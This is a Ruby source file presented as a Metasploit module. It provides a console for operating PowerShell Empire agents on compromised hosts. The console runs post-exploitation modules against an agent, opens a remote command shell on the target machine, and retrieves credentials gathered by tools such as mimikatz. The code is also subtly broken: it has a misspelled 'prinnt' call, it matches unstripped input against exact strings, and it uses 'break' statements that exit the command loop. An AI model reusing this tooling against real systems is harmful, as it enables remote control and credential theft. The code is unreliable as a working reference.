##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core/empire_lib'
module Msf::EmpireUI
  def help
    help = { "show modules" => "This command will list all the availablemodules that can be executed against the target machine",
             "show info [module name]" => "This command will show the attributes and descriptions of a particular module. Usage: show info powershell/situational_awareness/network/powerview/find_gpo_location",
             "shell" => "This command will open up a shell prompt which will execute shell commands",
             "use module [module name]" => "This command will try running the module against the current agent. Usage: use module powershell/situational_awareness/network/powerview/find_gpo_location",
             "help" => "shows this help menu",
             "get credentials" => "This command will return every credentials stored in the Empire server fetched from different modules like mimikatz",
             "switch" => "This will take you back to the meterpreter session"}
    help.each do |command, description|
      puts"#{command}   :   #{description}"
    end
  end
  def ui_main(emp_object, agent_name)
    #Providing the user prompt in a loop unless a switch request is made
    user_command = ''
    while user_command != 'switch'
      print "msf-empire > "
      user_command = gets

      #Cases for user_commands
      #Command to get information about a particular module
      if user_command.to_s.include?("show info")
        string = user_command.to_s
        module_name = string[10..string.size]
        emp_object.info_module(module_name)

        #Command to execute a particular module againt the agent.
      elsif user_command.to_s.include?("use module")
        string = user_command.to_s
        module_name = string[12..string.size]
        prinnt "Executing module #{module_name} against #{agent_name}"
        emp_object.exec_module(module_name, agent_name)
      else
        case user_command
          #[1]Command to retrieve all the available modules for the Empire agent
          when "show modules"
            emp_object.get_modules
          break

          #[2]Command to retrieve information about a particular module
          when "shell"
            cmd_command = ''
            while cmd_command != 'exit'
              print " shell > "
              cmd_command = gets
              response = emp_object.exec_command(agent_name, cmd_command)
              if response.to_s.include?("successfully")
                puts emp_object.get_results(agent_name)
                emp_object.delete_results(agent_name)
              else
                puts response.to_s
              end
            end
          break

          #[3]Command to harvest stored credentials
          when "get credentials"
            emp_object.get_creds
          break

          #[4]Command to show the help menu
          when "help"
            help
          break

          #[5]Command to switch to meterpreter
          when "switch"
            puts "Switching to meterpreter"
          break
        end
      end
    end
  end
end



